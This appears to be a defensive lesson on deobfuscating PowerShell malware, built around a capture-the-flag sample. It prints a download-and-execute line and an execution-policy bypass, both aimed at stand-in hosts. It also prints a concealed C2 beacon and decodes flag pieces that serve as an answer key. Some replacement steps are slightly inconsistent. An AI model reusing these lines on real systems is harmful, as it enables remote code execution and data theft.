# Lesson: PowerShell Malware Analysis and Deobfuscation

## Table of Contents
1. [Introduction to PowerShell Malware](#introduction-to-powershell-malware)
2. [Why Attackers Use PowerShell](#why-attackers-use-powershell)
3. [Common Obfuscation Techniques](#common-obfuscation-techniques)
4. [Safe Static Analysis](#safe-static-analysis)
5. [Deobfuscation Methodology](#deobfuscation-methodology)
6. [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
7. [Windows Persistence Mechanisms](#windows-persistence-mechanisms)
8. [Command-and-Control (C2) Communication](#command-and-control-c2-communication)
9. [EDR Detection Capabilities](#edr-detection-capabilities)
10. [Practical Analysis Tools](#practical-analysis-tools)
11. [Best Practices](#best-practices)

---

## Introduction to PowerShell Malware

### What is PowerShell?

PowerShell is a powerful task automation and configuration management framework from Microsoft, consisting of:
- A command-line shell
- A scripting language built on .NET Framework
- Deep integration with Windows operating system
- Access to Windows Management Instrumentation (WMI)
- Ability to interact with .NET classes and COM objects

### Why is PowerShell Used for Malware?

PowerShell has become a favorite tool for attackers because:

1. **Pre-installed on Windows** - No need to drop additional binaries
2. **Trusted by security tools** - Often whitelisted in corporate environments
3. **Powerful capabilities** - Can perform almost any Windows operation
4. **"Living off the land"** - Uses legitimate system tools (LOTL attacks)
5. **Memory-only execution** - Can run without touching disk (fileless malware)
6. **Easy obfuscation** - Multiple encoding and obfuscation techniques available

### Types of PowerShell Malware

**Downloaders/Droppers:**
- Downloads and executes additional payloads
- First stage in multi-stage attacks

**Information Stealers:**
- Harvests credentials (browser passwords, cookies)
- Exfiltrates documents and sensitive files
- Captures screenshots and keystrokes

**Backdoors:**
- Establishes persistent remote access
- Communicates with Command-and-Control (C2) servers
- Executes commands from attackers

**Reconnaissance Tools:**
- Enumerates system information
- Maps network topology
- Identifies valuable targets

---

## Why Attackers Use PowerShell

### Advantages for Attackers

#### 1. System Integration
```powershell
# PowerShell can interact with everything:
Get-Process              # Process management
Get-Service              # Service management
Get-WmiObject            # System information
New-Object Net.WebClient # Network operations
```

#### 2. Bypass Traditional AV
Traditional antivirus struggles with PowerShell because:
- It's a legitimate Microsoft tool
- Thousands of benign scripts exist
- Signature-based detection is ineffective against obfuscation
- Behavior varies widely between malicious and legitimate use

#### 3. Remote Execution
PowerShell enables remote code execution through:
```powershell
# Download and execute in memory (no file written to disk)
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')

# Execute encoded commands
powershell.exe -EncodedCommand <base64_encoded_payload>

# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File malware.ps1
```

#### 4. Credential Access
PowerShell can access various credential stores:
- Windows Credential Manager
- Browser credential databases (Chrome, Firefox, Edge)
- Registry-stored passwords
- Memory dumps of running processes

---

## Common Obfuscation Techniques

Attackers obfuscate PowerShell malware to evade detection. Here are the most common techniques:

### 1. Base64 Encoding

**What it is:** Converting text to base64 to hide readable strings.

**How it looks:**
```powershell
# Original
Invoke-WebRequest -Uri "http://malicious.com"

# Obfuscated with base64
$encoded = "SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL21hbGljaW91cy5jb20i"
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
Invoke-Expression $decoded
```

**How to decode (safely):**
```powershell
$encoded = "SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL21hbGljaW91cy5jb20i"
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
Write-Output $decoded  # Just view it, don't execute!
```

**Recognition patterns:**
- Long strings of alphanumeric characters with `+`, `/`, and `=` padding
- Often passed to `[Convert]::FromBase64String()`
- May appear in `-EncodedCommand` parameters

### 2. String Reversal

**What it is:** Storing strings backwards to hide domains, IPs, and commands.

**How it looks:**
```powershell
# Original domain: malicious.com
$reversed = "moc.suoicilam"
$arr = $reversed.ToCharArray()
[array]::Reverse($arr)
$domain = -join $arr
# Result: "malicious.com"
```

**How to decode (safely):**
```powershell
$reversed = "ten.elophron"
$arr = $reversed.ToCharArray()
[array]::Reverse($arr)
$original = -join $arr
Write-Output $original  # "northpole.net"
```

**Recognition patterns:**
- Backwards-looking domain names or IPs
- Use of `[array]::Reverse()`
- Character array operations with `-join`

### 3. Character Replacement

**What it is:** Replacing characters to obfuscate keywords.

**How it looks:**
```powershell
# Original: "WindowsSecurity"
"WxndowsSeTurxty".Replace('T','c').Replace('x','i').Replace('a','i')
```

**How to decode (safely):**
Manually apply each replacement in order:
```
Step 1: "WxndowsSeTurxty".Replace('T','c') → "WxndowsSecurity"
Step 2: "WxndowsSecurity".Replace('x','i') → "WindowsSecurity"
Step 3: "WindowsSecurity".Replace('a','i') → "WindowsSecurity"
```

**Recognition patterns:**
- Multiple chained `.Replace()` calls
- Nonsensical strings with obvious character substitutions

### 4. String Concatenation

**What it is:** Breaking strings into multiple variables and joining them.

**How it looks:**
```powershell
$a = "Invo"
$b = "ke-W"
$c = "ebRe"
$d = "quest"
$command = $a + $b + $c + $d  # "Invoke-WebRequest"
& $command -Uri "http://malicious.com"
```

**Recognition patterns:**
- Short variable names with partial strings
- Lots of `+` operators or `-join` usage
- Variables passed to `&` (call operator) or `Invoke-Expression`

### 5. XOR Encoding

**What it is:** XOR (exclusive OR) is a bitwise operation used to encrypt/obfuscate data. Each byte is XORed with a key value to produce encoded output. XORing again with the same key reverses the operation.

**Why attackers use it:**
- Simple but effective obfuscation
- Harder to detect than base64 (no obvious patterns)
- Requires knowing the key to decode
- Can be applied to binary data or text

**Mathematical concept:**
```
Original byte:  01001000  (H = 72)
XOR key:        01101110  (n = 110)
                --------
Encoded byte:   00100110  (& = 38)

Decode (XOR again with same key):
Encoded byte:   00100110  (& = 38)
XOR key:        01101110  (n = 110)
                --------
Original byte:  01001000  (H = 72) ← Back to original!
```

**How it looks in PowerShell:**
```powershell
# Encoding a string with XOR
$plaintext = "FROST"
$key = 110  # Decimal value of 'n'

# Encode each character
$encoded = $plaintext.ToCharArray() | ForEach-Object {
    [byte]$_ -bxor $key
}
# Result: @(40, 60, 33, 61, 58)

# Decode (XOR again with same key)
$decoded = $encoded | ForEach-Object {
    [char]($_ -bxor $key)
}
$result = -join $decoded
# Result: "FROST"
```

**Real-world example from malware:**
```powershell
# What you might see in a malicious script:
$cfg1 = @(40, 60, 33, 61, 58)  # Array of encoded bytes
$fp1 = -join ($cfg1 | ForEach-Object { [char]($_ -bxor 110) })
# This decodes to: "FROST"
```

**How to decode (safely):**

**Method 1: PowerShell (manual calculation)**
```powershell
# Copy just the variable definition
$cfg1 = @(40, 60, 33, 61, 58)

# Test different XOR keys (common keys: 0x6E=110, 0xFF=255, 0x42=66)
$key = 110
$decoded = -join ($cfg1 | ForEach-Object { [char]($_ -bxor $key) })
Write-Output "Key $key : $decoded"

# Output: "Key 110 : FROST"
```

**Method 2: Brute force the key (if unknown)**
```powershell
# Try all possible single-byte XOR keys (0-255)
$cfg1 = @(40, 60, 33, 61, 58)

for ($key = 0; $key -le 255; $key++) {
    $decoded = -join ($cfg1 | ForEach-Object { [char]($_ -bxor $key) })
    # Check if result looks like readable text
    if ($decoded -match '^[A-Z]+$') {
        Write-Output "Key $key : $decoded"
    }
}
# This will find: "Key 110 : FROST"
```

**Method 3: CyberChef**
1. Go to https://gchq.github.io/CyberChef/
2. Drag "XOR" operation to Recipe
3. Input: `40,60,33,61,58` (as comma-separated decimals)
4. Key: `110` (decimal) or `6E` (hex) or `n` (character)
5. Check "From Decimal" option
6. Read output: "FROST"

**Recognition patterns:**
- Arrays of numeric values (especially in range 0-255)
- `-bxor` operator in PowerShell
- `ForEach-Object { [char]($_ -bxor $key) }`
- Variable names like `$cfg`, `$key`, `$xorKey`

**Common XOR keys used by attackers:**
- `0x6E` (110, character 'n')
- `0x42` (66, character 'B')
- `0xFF` (255, inverts all bits)
- `0x00` (0, no change - sometimes used as dummy)
- Single characters: 'A', 'Z', '!', '@'

### 6. Encoding Entire Commands

**What it is:** Encoding entire PowerShell scripts for execution.

**How it looks:**
```powershell
# Attacker encodes their entire payload
powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==
```

**How to decode (safely):**
```powershell
# This is UTF-16LE base64 (PowerShell's default encoding)
$encoded = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
Write-Output $decoded
```

### 7. Variable Name Obfuscation

**What it is:** Using meaningless variable names to hide intent.

**Example:**
```powershell
# Clear variable names (normal script)
$serverUrl = "https://updates.example.com"
$updateData = Invoke-WebRequest -Uri $serverUrl

# Obfuscated variable names (malware)
$x1b9 = "aHR0cHM6Ly9tYWxpY2lvdXMuY29t"
$q5w = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x1b9))
```

---

## Safe Static Analysis

### The Golden Rule: NEVER EXECUTE

**NEVER do these things:**
```powershell
# ❌ NEVER use Invoke-Expression
Invoke-Expression $suspicious_code
IEX $suspicious_code

# ❌ NEVER use the call operator on unknown code
& $decoded_command

# ❌ NEVER use the dot-source operator
. $malicious_script

# ❌ NEVER pipe to Invoke-Expression
$code | IEX

# ❌ NEVER run scripts with unknown parameters
.\malware.ps1 -Parameter "value"
```

### Safe Analysis Operations

**✅ SAFE operations:**
```powershell
# ✓ Base64 decoding (just viewing)
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
Write-Output $decoded  # Or Write-Host, echo, etc.

# ✓ String reversal (just viewing)
$arr = $reversed.ToCharArray()
[array]::Reverse($arr)
$original = -join $arr
Write-Output $original

# ✓ Character replacement (manual, on paper)
# Just write it down: "WxndowsSeTurxty" → "WindowsSecurity"

# ✓ Reading variable assignments
# Just look at what values are stored, don't execute anything
```

### Analysis Environment Safety

**Best practices for safety:**

1. **Use a text editor**, not PowerShell ISE in execution mode
   - Notepad++
   - Visual Studio Code
   - Sublime Text
   - Vim/Nano

2. **Use CyberChef** for decoding (web-based, completely safe)
   - https://gchq.github.io/CyberChef/
   - No risk of accidental execution
   - Built-in operations for base64, reverse, find/replace

3. **Isolated VM** (if absolutely necessary to test)
   - No network access
   - Snapshot before any testing
   - Never connect to production networks

4. **Read-only PowerShell** (for safe decoding only)
   - Only use `Write-Output`, never `Invoke-Expression`
   - Type commands manually, don't copy-paste entire scripts
   - Work with small snippets at a time

---

## Safe Dynamic Analysis - Testing Individual Variables

### What is Safe Dynamic Analysis?

Safe dynamic analysis means executing ONLY the deobfuscation parts of the malware to reveal hidden strings, without executing the actual malicious functionality (network connections, file operations, registry modifications).

**The golden rule:** Extract and test ONLY variable assignments and decoding logic, NEVER the action commands.

### How to Safely Test PowerShell Variables

#### Method 1: Extract Variable Definitions Only

**❌ UNSAFE - Running entire script:**
```powershell
# NEVER do this - runs entire malicious script
.\system_update.ps1
```

**✅ SAFE - Extract only variable definitions:**

**Step 1:** Open PowerShell (NOT PowerShell ISE in run mode)

**Step 2:** Copy ONLY the variable definition and decoding logic:

```powershell
# Original malware (lines 25-26):
$cfg1 = @(40,60,33,61,58)
$fp1 = -join ($cfg1 | ForEach-Object { [char]($_ -bxor 110) })

# What to copy to PowerShell:
$cfg1 = @(40,60,33,61,58)
$fp1 = -join ($cfg1 | ForEach-Object { [char]($_ -bxor 110) })
Write-Output $fp1  # Display the result
```

**Step 3:** Press Enter and observe the output:
```
FROST
```

**Why this is safe:**
- No `Invoke-WebRequest` (no network calls)
- No `Copy-Item` (no file operations)
- No `Set-ItemProperty` (no registry modifications)
- Only decoding and displaying text

#### Method 2: Test Each Encoding Layer Separately

**Complex multi-layer encoding example:**
```powershell
# Original malware (lines 37-39):
$timing_cfg = 'X2xsM2hzcjN3MHB7'
$fp2_temp = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($timing_cfg))
$fp2_arr = $fp2_temp.ToCharArray(); [array]::Reverse($fp2_arr); $fp2 = -join $fp2_arr
```

**Safe testing - layer by layer:**

```powershell
# Layer 1: Base64 decode
$timing_cfg = 'X2xsM2hzcjN3MHB7'
$fp2_temp = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($timing_cfg))
Write-Output "After Base64: $fp2_temp"
# Output: "_ll3hsr3w0p{"

# Layer 2: Reverse
$fp2_arr = $fp2_temp.ToCharArray()
[array]::Reverse($fp2_arr)
$fp2 = -join $fp2_arr
Write-Output "After Reverse: $fp2"
# Output: "{p0w3rsh3ll_"
```

**Why layer-by-layer is better:**
- See intermediate results (easier debugging)
- Understand each encoding technique
- Catch mistakes early
- Build your understanding incrementally

#### Method 3: Commenting Out Dangerous Code

**Original malware excerpt:**
```powershell
# Decode configuration
$cfg1 = @(40,60,33,61,58)
$fp1 = -join ($cfg1 | ForEach-Object { [char]($_ -bxor 110) })

# DANGER: Network beacon
$cmd_parts = @("Invo", "ke-W", "ebRe", "quest")
$full_cmd = -join $cmd_parts
& $full_cmd -Uri $m4v -Method POST -Body $beacon_body
```

**Safe analysis - comment out dangerous parts:**
```powershell
# Decode configuration (SAFE - just decoding)
$cfg1 = @(40,60,33,61,58)
$fp1 = -join ($cfg1 | ForEach-Object { [char]($_ -bxor 110) })
Write-Output "Decoded config: $fp1"

# DANGER: Network beacon (COMMENTED OUT - won't run)
# $cmd_parts = @("Invo", "ke-W", "ebRe", "quest")
# $full_cmd = -join $cmd_parts
# & $full_cmd -Uri $m4v -Method POST -Body $beacon_body

# Instead, just see what command it would have built:
$cmd_parts = @("Invo", "ke-W", "ebRe", "quest")
$full_cmd = -join $cmd_parts
Write-Output "Command it would run: $full_cmd"
# Output: Invoke-WebRequest (but we don't actually call it!)
```

#### Method 4: Testing in a Safe Sandboxed PowerShell Session

**Create an isolated test environment:**

```powershell
# Start PowerShell with no profile (cleaner environment)
powershell.exe -NoProfile

# Set execution policy for this session only
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Now test your decoded variables
$cfg1 = @(40,60,33,61,58)
$fp1 = -join ($cfg1 | ForEach-Object { [char]($_ -bxor 110) })
Write-Output $fp1

# Exit when done
exit
```

### What to Extract and Test

#### ✅ SAFE to test:

**Variable assignments:**
```powershell
$x1b9 = 'dGVuLmR1b2xjLWVsb3Bocm9uLnNldGFkcHUtdGVuc3RvcmY='
$cfg1 = @(40,60,33,61,58)
$timing_cfg = 'X2xsM2hzcjN3MHB7'
```

**Decoding operations:**
```powershell
$decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
$reversed = -join ($string.ToCharArray() | %{$_} | Reverse)
$xor_decoded = -join ($bytes | ForEach-Object { [char]($_ -bxor 110) })
```

**String manipulations:**
```powershell
$result = $var.Replace('X','0').Replace('Y','@')
$combined = $part1 + $part2 + $part3
```

**Display commands:**
```powershell
Write-Output $variable
Write-Host "Result: $decoded"
echo $flag
```

#### ❌ DANGEROUS - NEVER test:

**Network operations:**
```powershell
Invoke-WebRequest -Uri "http://malicious.com"
New-Object Net.WebClient).DownloadString(...)
Start-BitsTransfer
```

**File operations:**
```powershell
Copy-Item $malware -Destination "C:\Windows\..."
Remove-Item -Path "C:\Important\File.txt"
Set-Content -Path "C:\..." -Value $malicious_content
```

**Registry modifications:**
```powershell
Set-ItemProperty -Path "HKCU:\..." -Name "..." -Value "..."
New-ItemProperty -Path "HKLM:\..."
```

**Process execution:**
```powershell
Start-Process "malware.exe"
& $command  # Call operator - could run anything!
Invoke-Expression $untrusted_code  # Could execute anything!
```

**System modifications:**
```powershell
Set-ExecutionPolicy Unrestricted
New-ScheduledTask
Register-ScheduledTask
```

### Practical Example: Full Safe Deobfuscation Workflow

**Given this malware snippet:**
```powershell
$x1b9 = 'dGVuLmR1b2xjLWVsb3Bocm9uLnNldGFkcHUtdGVuc3RvcmY='
$q5w = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x1b9))
$k9m_arr = $q5w.ToCharArray(); [array]::Reverse($k9m_arr); $k9m = -join $k9m_arr
Invoke-WebRequest -Uri "http://$k9m/malicious"
```

**Safe testing process:**

**Step 1: Test base64 decode**
```powershell
PS> $x1b9 = 'dGVuLmR1b2xjLWVsb3Bocm9uLnNldGFkcHUtdGVuc3RvcmY='
PS> $q5w = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x1b9))
PS> Write-Output "Base64 decoded: $q5w"
Base64 decoded: ten.duolc-elophron.setadpu-tenstorf
```

**Step 2: Test reversal**
```powershell
PS> $k9m_arr = $q5w.ToCharArray()
PS> [array]::Reverse($k9m_arr)
PS> $k9m = -join $k9m_arr
PS> Write-Output "After reversal: $k9m"
After reversal: frostnet-updates.northpole-cloud.net
```

**Step 3: Document findings (DON'T execute the request)**
```powershell
PS> # Now we know the C2 domain without actually connecting!
PS> Write-Output "Malicious C2 domain: $k9m"
Malicious C2 domain: frostnet-updates.northpole-cloud.net

# ❌ DON'T RUN: Invoke-WebRequest -Uri "http://$k9m/malicious"
# ✅ DO: Add domain to IOC list for blocking
```

### Building a Safe Testing Script

Create a reusable template for safe testing:

```powershell
# safe_deobfuscate.ps1
# Template for safely testing obfuscated variables

Write-Host "=== Safe PowerShell Deobfuscation Testing ===" -ForegroundColor Cyan
Write-Host ""

# Test 1: XOR Decoding
Write-Host "[Test 1] XOR Decoding" -ForegroundColor Yellow
$cfg1 = @(40,60,33,61,58)
$fp1 = -join ($cfg1 | ForEach-Object { [char]($_ -bxor 110) })
Write-Host "Result: $fp1" -ForegroundColor Green
Write-Host ""

# Test 2: Base64 + Reversal
Write-Host "[Test 2] Base64 + Reversal" -ForegroundColor Yellow
$timing_cfg = 'X2xsM2hzcjN3MHB7'
$fp2_temp = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($timing_cfg))
Write-Host "After Base64: $fp2_temp"
$fp2_arr = $fp2_temp.ToCharArray(); [array]::Reverse($fp2_arr); $fp2 = -join $fp2_arr
Write-Host "After Reverse: $fp2" -ForegroundColor Green
Write-Host ""

# Test 3: Character Substitution + Reversal
Write-Host "[Test 3] Substitution + Reversal" -ForegroundColor Yellow
$err_mode = 'ZtsYm_nX1tYcsufbX'
$fp3_arr = $err_mode.ToCharArray(); [array]::Reverse($fp3_arr); $fp3_temp = -join $fp3_arr
Write-Host "After Reverse: $fp3_temp"
$fp3 = $fp3_temp.Replace('X','0').Replace('Y','@').Replace('Z','3')
Write-Host "After Substitution: $fp3" -ForegroundColor Green
Write-Host ""

# Test 4: Simple Base64
Write-Host "[Test 4] Simple Base64" -ForegroundColor Yellow
$chk = 'cn0='
$fp4 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($chk))
Write-Host "Result: $fp4" -ForegroundColor Green
Write-Host ""

# Final Assembly
Write-Host "[Final] Concatenate All Pieces" -ForegroundColor Yellow
$flag = $fp1 + $fp2 + $fp3 + $fp4
Write-Host "Complete Flag: $flag" -ForegroundColor Magenta
Write-Host ""

Write-Host "=== Testing Complete - No Malicious Code Executed ===" -ForegroundColor Cyan
```

**Save this as `safe_deobfuscate.ps1` and run:**
```powershell
.\safe_deobfuscate.ps1
```

**Output:**
```
=== Safe PowerShell Deobfuscation Testing ===

[Test 1] XOR Decoding
Result: FROST

[Test 2] Base64 + Reversal
After Base64: _ll3hsr3w0p{
After Reverse: {p0w3rsh3ll_

[Test 3] Substitution + Reversal
After Reverse: Xbfusc@t10n_m@stZ
After Substitution: 0bfusc@t10n_m@st3

[Test 4] Simple Base64
Result: r}

[Final] Concatenate All Pieces
Complete Flag: FROST{...} (decode all pieces to see the full flag!)

=== Testing Complete - No Malicious Code Executed ===
```

### Troubleshooting Common Safe Analysis Mistakes

**Problem: "I accidentally ran the whole script!"**
```
❌ Mistake: Double-clicked the .ps1 file or ran: .\malware.ps1
✅ Fix: Next time, open in text editor first. Copy only specific lines.
✅ Recovery: If in isolated VM, revert to snapshot. If on real system, check:
   - Run `Get-NetTCPConnection` to see if malware made connections
   - Check Run keys: `Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`
   - Review recent file changes in AppData
```

**Problem: "PowerShell says 'execution policy prevents script from running'"**
```
❌ Don't bypass globally: Set-ExecutionPolicy Unrestricted (dangerous!)
✅ Better: Set for current session only:
   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
✅ Best: Don't run scripts at all, just paste individual lines
```

**Problem: "I can't tell which parts are safe to run"**
```
✅ Ask yourself:
   1. Does this line connect to the internet? → DON'T RUN
   2. Does this line modify files? → DON'T RUN
   3. Does this line change the registry? → DON'T RUN
   4. Does this line only decode a string? → SAFE TO RUN
   5. Does this line only display output? → SAFE TO RUN
```

---

## Deobfuscation Methodology

### Step-by-Step Workflow

#### Step 1: Initial Triage

**Questions to ask:**
- What is the file name? (Does it mimic legitimate files?)
- What is the file size? (Unusually large or small?)
- Are there obvious signs of obfuscation? (Base64 strings, random variable names)
- What triggered the alert? (EDR, AV, user report)

**Initial observations:**
```powershell
# Look for:
- Short, meaningless variable names ($x1b9, $q5w, $t3r)
- Base64 strings (long alphanumeric with = padding)
- Encoding functions ([Convert]::FromBase64String)
- Array reversals ([array]::Reverse)
- Character replacements (.Replace calls)
- String concatenation (lots of + operators)
- Silent error handling (-ErrorAction SilentlyContinue)
- Hidden windows (-WindowStyle Hidden)
- Execution policy bypasses (-ExecutionPolicy Bypass)
```

#### Step 2: Identify Encoding Layers

**Map out the encoding chain:**
```
Variable $x1b9:
  Base64 encoded → Decoded to $q5w
  → Still reversed → Reversed to $k9m
  → Final value: actual domain name
```

**Create a decoding plan:**
1. List all suspicious variables
2. Identify what encoding is applied to each
3. Determine the order of operations
4. Plan your decoding approach

#### Step 3: Decode Base64 Strings

**For each base64-encoded variable:**

**Method 1: PowerShell (safe)**
```powershell
# Example: Decode $x1b9
$encoded = 'dGVuLmR1b2xjLWVsb3Bocm9uLnNldGFkcHUtdGVuc3RvcmY='
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
Write-Output $decoded
# Output: "ten.duolc-elophron.setadpu-tenstorf"
```

**Method 2: CyberChef (safest)**
1. Go to https://gchq.github.io/CyberChef/
2. Drag "From Base64" to the Recipe
3. Paste your base64 string in Input
4. Read the Output

**Method 3: Command line**
```bash
# Linux/Mac
echo "dGVuLmR1b2xjLWVsb3Bocm9uLnNldGFkcHUtdGVuc3RvcmY=" | base64 -d

# Windows PowerShell
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("dGVuLmR1b2xjLWVsb3Bocm9uLnNldGFkcHUtdGVuc3RvcmY="))
```

#### Step 4: Reverse Strings

**Identify reversed strings:**
- Domain names that look backwards
- IP addresses in reverse
- File paths that don't make sense

**Reverse them:**

**Method 1: PowerShell**
```powershell
$reversed = "ten.duolc-elophron.setadpu-tenstorf"
$arr = $reversed.ToCharArray()
[array]::Reverse($arr)
$original = -join $arr
Write-Output $original
# Output: "frostnet-updates.northpole-cloud.net"
```

**Method 2: CyberChef**
1. Use the "Reverse" operation
2. Paste the backwards string
3. Read the corrected output

**Method 3: Manual (for short strings)**
- Write it backwards character by character
- Or use an online string reverser tool

#### Step 5: Apply Character Replacements

**Track replacement chains:**
```powershell
# Original: "WandowsSeTurxtyUpdate"
# Step 1: .Replace('T','c') → "WandowsSecurity"
# Step 2: .Replace('x','i') → "WandowsSecurity"
# Step 3: .Replace('a','i') → "WindowsSecurity"
```

**Manual method:**
1. Write down the original string
2. Apply each `.Replace()` operation in order
3. Note the final result

#### Step 6: Reconstruct Commands

**Piece together the attack:**
```powershell
# After deobfuscation, you might find:
$url = "http://frostnet-updates.northpole-cloud.net:8080/checkin"
Invoke-WebRequest -Uri $url -Method POST -Body "checkin=COMPUTERNAME"
```

**Understand the intent:**
- What is the script trying to connect to?
- What data is being sent?
- What data is being received?
- Where is data being stored?

#### Step 6.5: Multi-Variable Flag/Configuration Reconstruction

**What is it:** Advanced malware often splits sensitive data (flags, C2 URLs, encryption keys) across multiple variables to avoid simple string searches. You must deobfuscate each piece individually, then concatenate them in the correct order.

**Why attackers do this:**
- Evades signature-based detection (can't search for complete string)
- Makes analysis harder (analyst must find all pieces)
- Can hide the true purpose until final assembly
- Spreads obfuscation across multiple encoding techniques

**Example from real malware:**
```powershell
# The script has 4 separate variables:
$cfg1 = @(40,60,33,61,58)                    # XOR encoded
$timing_cfg = 'X2xsM2hzcjN3MHB7'              # Base64 + reversed
$err_mode = 'ZtsYm_nX1tYcsufbX'               # Character substitution + reversed
$chk = 'cn0='                                 # Simple base64

# These are concatenated later:
# $flag = $fp1 + $fp2 + $fp3 + $fp4
```

**Reconstruction methodology:**

**Step 1: Identify all flag piece variables**
```
Look for patterns:
- Variable names ending in numbers: $fp1, $fp2, $fp3, $fp4
- Variable names with similar prefixes: $cfg1, $cfg2, $cfg3
- Comments mentioning "concatenate", "assemble", "combine"
- Code with: $final = $var1 + $var2 + $var3
```

**Step 2: Deobfuscate each piece individually**

```powershell
# Piece 1 (XOR with key 110)
$cfg1 = @(40,60,33,61,58)
$fp1 = -join ($cfg1 | ForEach-Object { [char]($_ -bxor 110) })
Write-Output "Piece 1: $fp1"
# Output: "FROST"

# Piece 2 (Base64 + reverse)
$timing_cfg = 'X2xsM2hzcjN3MHB7'
$fp2_temp = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($timing_cfg))
$fp2_arr = $fp2_temp.ToCharArray()
[array]::Reverse($fp2_arr)
$fp2 = -join $fp2_arr
Write-Output "Piece 2: $fp2"
# Output: "{p0w3rsh3ll_"

# Piece 3 (Substitution X→0, Y→@, Z→3 + reverse)
$err_mode = 'ZtsYm_nX1tYcsufbX'
$fp3_arr = $err_mode.ToCharArray()
[array]::Reverse($fp3_arr)
$fp3_temp = -join $fp3_arr
$fp3 = $fp3_temp.Replace('X','0').Replace('Y','@').Replace('Z','3')
Write-Output "Piece 3: $fp3"
# Output: "0bfusc@t10n_m@st3"

# Piece 4 (Simple base64)
$chk = 'cn0='
$fp4 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($chk))
Write-Output "Piece 4: $fp4"
# Output: "r}"
```

**Step 3: Determine concatenation order**

Look for clues in the code:
```powershell
# Method 1: Explicit concatenation
$flag = $fp1 + $fp2 + $fp3 + $fp4

# Method 2: String join
$flag = -join @($fp1, $fp2, $fp3, $fp4)

# Method 3: String formatting
$flag = "{0}{1}{2}{3}" -f $fp1, $fp2, $fp3, $fp4

# Method 4: Hidden in comments
# To verify script integrity, concatenate: $fp1 + $fp2 + $fp3 + $fp4
```

**Step 4: Assemble the final value**
```powershell
# Manually concatenate (safest)
$piece1 = "FROST"
$piece2 = "{p0w3rsh3ll_"
$piece3 = "0bfusc@t10n_m@st3"
$piece4 = "r}"

$complete_flag = $piece1 + $piece2 + $piece3 + $piece4
Write-Output $complete_flag
# Output: FROST{...} (the complete flag!)
```

**Step 5: Validate the result**
```
Check if the result makes sense:
✓ Starts with "FROST{" (expected flag format)
✓ Ends with "}" (proper closing)
✓ Contains l33tspeak (p0w3rsh3ll, 0bfusc@t10n)
✓ Thematically relevant (PowerShell obfuscation)
```

**Common mistakes to avoid:**
```
❌ Wrong order:
   $fp2 + $fp1 + $fp3 + $fp4 = "{p0w3rsh3ll_FROST0bfusc@t10n_m@st3r}" (broken!)

❌ Missing a piece:
   $fp1 + $fp2 + $fp4 = "FROST{p0w3rsh3ll_r}" (incomplete - missing piece 3!)

❌ Not fully deobfuscating a piece:
   $fp3_temp = -join $fp3_arr  # Forgot to apply .Replace() calls
   Result: "Xbfusc@t10n_m@stZ" (still encoded!)

✓ Correct:
   $fp1 + $fp2 + $fp3 + $fp4 = FROST{...} (complete flag with all pieces!)
```

**Pro tip - Create a decoding worksheet:**
```
┌─────────────────────────────────────────────────────────┐
│ Flag Piece Reconstruction Worksheet                    │
├─────────┬───────────────────────┬─────────────┬─────────┤
│ Piece # │ Variable Name         │ Encoding    │ Decoded │
├─────────┼───────────────────────┼─────────────┼─────────┤
│    1    │ $cfg1                 │ XOR (110)   │ FROST   │
│    2    │ $timing_cfg           │ B64+Reverse │ {p0w... │
│    3    │ $err_mode             │ Sub+Reverse │ 0bfu... │
│    4    │ $chk                  │ Base64      │ r}      │
├─────────┴───────────────────────┴─────────────┴─────────┤
│ Final concatenation: Piece1 + Piece2 + Piece3 + Piece4 │
│ Result: FROST{...} (decode all pieces yourself!)       │
└─────────────────────────────────────────────────────────┘
```

#### Step 7: Extract IOCs

**Document everything you find:**

**Network IOCs:**
- C2 domain names
- C2 IP addresses
- Ports used
- URL paths
- HTTP methods

**File IOCs:**
- File paths created
- File names (especially mimicking legitimate processes)
- File hashes (if available)

**Registry IOCs:**
- Registry key paths
- Registry value names
- Registry value data

**Behavioral IOCs:**
- Processes spawned
- Services created/modified
- Scheduled tasks created
- Data exfiltrated (what files/folders)

---

## Indicators of Compromise (IOCs)

### What are IOCs?

Indicators of Compromise are forensic artifacts that indicate a system has been compromised. They help defenders:
- Detect similar attacks on other systems
- Block malicious infrastructure
- Create signatures and detection rules
- Understand attacker tactics, techniques, and procedures (TTPs)

### Types of IOCs

#### 1. Network IOCs

**Domain names:**
```
frostnet-updates.northpole-cloud.net
malware-c2.example.com
suspicious-domain.tk
```

**IP addresses:**
```
203.0.113.99
192.0.2.50
198.51.100.25
```

**URLs:**
```
http://c2server.com:8080/checkin
https://evil.com/exfil
http://malware.net/download/payload.exe
```

**Ports and protocols:**
```
Port 8080 (HTTP on non-standard port)
Port 4444 (common Metasploit port)
Port 443 (HTTPS - could be C2 over SSL)
```

#### 2. File IOCs

**File paths:**
```
C:\Users\<username>\AppData\Roaming\svchost.ps1
C:\Windows\Temp\update.ps1
C:\ProgramData\Windows\system_service.ps1
```

**File names:**
```
